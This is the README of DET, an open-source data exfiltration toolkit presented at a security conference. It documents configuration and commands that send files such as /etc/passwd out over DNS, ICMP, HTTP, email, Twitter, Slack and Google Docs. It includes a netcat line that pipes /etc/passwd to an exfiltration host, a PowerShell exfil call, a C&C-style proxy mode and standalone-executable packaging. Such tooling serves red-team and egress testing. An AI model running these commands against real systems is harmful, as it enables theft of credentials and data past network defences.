DET (extensible) Data Exfiltration Toolkit
=======

DET (is provided AS IS), is a proof of concept to perform Data Exfiltration using either single or multiple channel(s) at the same time.
The idea was to create a generic toolkit to plug any kind of protocol/service.

# Slides

DET has been presented at [BSides Ljubljana](https://bsidesljubljana.si/) on the 9th of March 2016 and the slides will be available here.
Slides are available [here](https://docs.google.com/presentation/d/11uk6d-xougn3jU1wu4XRM3ZGzitobScSSMUlx0MRTzg).

# Example usage (ICMP plugin)

## Server-side: 

[![asciicast](https://asciinema.org/a/18rjfp59rc7w27q7vlzlr96qv.png)](https://asciinema.org/a/18rjfp59rc7w27q7vlzlr96qv)

## Client-side: 

[![asciicast](https://asciinema.org/a/9m7ovlh7e4oyztx8e3fxyqsbl.png)](https://asciinema.org/a/9m7ovlh7e4oyztx8e3fxyqsbl)


# Usage while combining two channels (Gmail/Twitter)

## Server-side: 

[![asciicast](https://asciinema.org/a/9lfpo9m47y5sglvdd1kyb1lwj.png)](https://asciinema.org/a/9lfpo9m47y5sglvdd1kyb1lwj)

## Client-side: 

[![asciicast](https://asciinema.org/a/bfstssgptxd41ncces4981cn6.png)](https://asciinema.org/a/bfstssgptxd41ncces4981cn6)


# Installation

Clone the repo: 

```bash
git clone https://github.com/conix-security/DET.git
```

Then: 

```bash
pip install -r requirements.txt --user
```

# Configuration

In order to use DET, you will need to configure it and add your proper settings (eg. SMTP/IMAP, AES256 encryption
passphrase, proxies and so on). A configuration example file has been provided and is called: ```config-sample.json```

```json
{
    "plugins": {
        "http": {
            "target": "192.168.0.12",
            "port": 8080,
            "proxies": ["192.168.0.13", "192.168.0.14"]
        },
        "google_docs": {
            "target": "conchwaiter.uk.plak.cc",
            "port": 8080 
        },        
        "dns": {
            "key": "google.com",
            "target": "192.168.0.12",
            "port": 53,
            "proxies": ["192.168.0.13", "192.168.0.14"]
        },
[...SNIP...]
        "icmp": {
            "target": "192.168.0.12",
            "proxies": ["192.168.0.13", "192.168.0.14"]
        },
        "slack": {
            "api_token": "xoxb-XXXXXXXXXXX",
            "chan_id": "XXXXXXXXXXX",
            "bot_id": "<@XXXXXXXXXXX>:"
        },
        "smtp": {
            "target": "192.168.0.12",
            "port": 25,
            "proxies": ["192.168.0.13", "192.168.0.14"]
        },
        "ftp": {
            "target": "192.168.0.12",
            "port": 21,
            "proxies": ["192.168.0.13", "192.168.0.14"]
        },
        "sip": {
            "target": "192.168.0.12",
            "port": 5060,
            "proxies": ["192.168.0.13", "192.168.0.14"]
        }
    },
    "AES_KEY": "THISISACRAZYKEY",
    "max_time_sleep": 10,
    "min_time_sleep": 1,
    "max_bytes_read": 400,
    "min_bytes_read": 300,
    "compression": 1
}
```

# Usage

## Help usage

```bash
python det.py -h
usage: det.py [-h] [-c CONFIG] [-f FILE] [-d FOLDER] [-p PLUGIN] [-e EXCLUDE]
              [-L | -Z]

Data Exfiltration Toolkit (Conix-Security)

optional arguments:
  -h, --help  show this help message and exit
  -c CONFIG   Configuration file (eg. '-c ./config-sample.json')
  -f FILE     File to exfiltrate (eg. '-f /etc/passwd')
  -d FOLDER   Folder to exfiltrate (eg. '-d /etc/')
  -p PLUGIN   Plugins to use (eg. '-p dns,twitter')
  -e EXCLUDE  Plugins to exclude (eg. '-e gmail,icmp')
  -L          Server mode
  -Z          Proxy mode
```

## Server-side: 

To load every plugin:

```bash
python det.py -L -c ./config.json
```

To load *only* twitter and gmail modules: 

```bash
python det.py -L -c ./config.json -p twitter,gmail
```

To load every plugin and exclude DNS: 

```bash
python det.py -L -c ./config.json -e dns
```

## Client-side:

To load every plugin: 

```bash
python det.py -c ./config.json -f /etc/passwd
```

To load *only* twitter and gmail modules: 

```bash
python det.py -c ./config.json -p twitter,gmail -f /etc/passwd
```

To load every plugin and exclude DNS: 

```bash
python det.py -c ./config.json -e dns -f /etc/passwd
```
You can also listen for files from stdin (e.g output of a netcat listener):

```bash
nc -lp 1337 | python det.py -c ./config.json -e http -f stdin
```
Then send the file to netcat:

```bash
nc $exfiltration_host 1337 -q 0 < /etc/passwd
```
Don't forget netcat's `-q 0` option so that netcat quits once it has finished sending the file.

And in PowerShell (HTTP module): 

```powershell
PS C:\Users\user01\Desktop>
PS C:\Users\user01\Desktop> . .\http_exfil.ps1
PS C:\Users\user01\Desktop> HTTP-exfil 'C:\path\to\file.exe'
```

## Proxy mode:

In this mode the client will proxify the incoming requests towards the final destination.
The proxies addresses should be set in ```config.json``` file.

```bash
python det.py -c ./config.json -p dns,icmp -Z
```

# Standalone package

DET has been adapted in order to run as a standalone executable with the help of [PyInstaller](http://www.pyinstaller.org/).

```bash
pip install pyinstaller
```

The spec file ```det.spec``` is provided in order to help you build your executable.

```python
# -*- mode: python -*-

block_cipher = None

import sys
sys.modules['FixTk'] = None

a = Analysis(['det.py'],
             pathex=['.'],
             binaries=[],
             datas=[('plugins', 'plugins'), ('config-sample.json', '.')],
             hiddenimports=['plugins/dns', 'plugins/icmp'],
             hookspath=[],
             runtime_hooks=[],
             excludes=['FixTk', 'tcl', 'tk', '_tkinter', 'tkinter', 'Tkinter'],
             win_no_prefer_redirects=False,
             win_private_assemblies=False,
             cipher=block_cipher)
pyz = PYZ(a.pure, a.zipped_data,
             cipher=block_cipher)
exe = EXE(pyz,
          a.scripts,
          a.binaries,
          a.zipfiles,
          a.datas,
          name='det',
          debug=False,
          strip=False,
          upx=True,
          console=True )
```

Specify the modules you need to ship with you executable by editing the ```hiddenimports``` array.
In the example above, PyInstaller will package the DNS and ICMP plugins along with your final executable.
Finally, launch PyInstaller:

```base
pyinstaller det.spec
```

Please note that the number of loaded plugins will reflect on the size of the final executable.
If you have issues with the generated executable or found a workaround for a tricky situation, please open an issue so this guide can be updated for everyone.

# Modules

So far, DET supports multiple protocols, listed here: 

- [X] HTTP(S)
- [X] ICMP
- [X] DNS
- [X] SMTP/IMAP (Pure SMTP + Gmail)
- [X] Raw TCP / UDP
- [X] FTP
- [X] SIP
- [X] PowerShell implementation (HTTP, DNS, ICMP, SMTP (used with Gmail))

And other "services": 

- [X] Google Docs (Unauthenticated)
- [X] Twitter (Direct Messages)
- [X] Slack

# Roadmap

- [X] Add proper encryption (eg. AES-256) Thanks to [ryanohoro](https://github.com/ryanohoro)
- [X] Compression (extremely important!) Thanks to [chokepoint](https://github.com/chokepoint)
- [X] Add support for C&C-like multi-host file exfiltration (Proxy mode)
- [ ] Discovery mode (where distributed agents can learn about the presence of each other)
- [ ] Egress traffic testing
- [ ] Proper data obfuscation and integrating [Cloakify Toolset Toolset](https://github.com/trycatchhcf/cloakify)
- [ ] FlickR [LSB Steganography](https://github.com/RobinDavid/LSB-Steganography) and Youtube modules

# References

Some pretty cool references/credits to people I got inspired by with their project: 

- [https://github.com/nullbind/Powershellery/](Powershellery) from Nullbind.
- [https://github.com/ytisf/PyExfil](PyExfil), truely awesome. 
- [https://github.com/m57/dnsteal](dnsteal) from m57.
- [https://github.com/3nc0d3r/NaishoDeNusumu](NaishoDeNusumu) from 3nc0d3r.
- [https://github.com/glennzw/exphil](Exphil) from Glenn Wilkinson.
- WebExfile from Saif El-Sherei

# Contact/Contributing

You can reach me on Twitter [@PaulWebSec](https://twitter.com/PaulWebSec) (original author) or [@therealnisay](https://twitter.com/therealnisay) (maintainer of this repo). 
Feel free if you want to contribute, clone, fork, submit your PR and so on.

# License

DET is licensed under a [MIT License](https://opensource.org/licenses/MIT). 
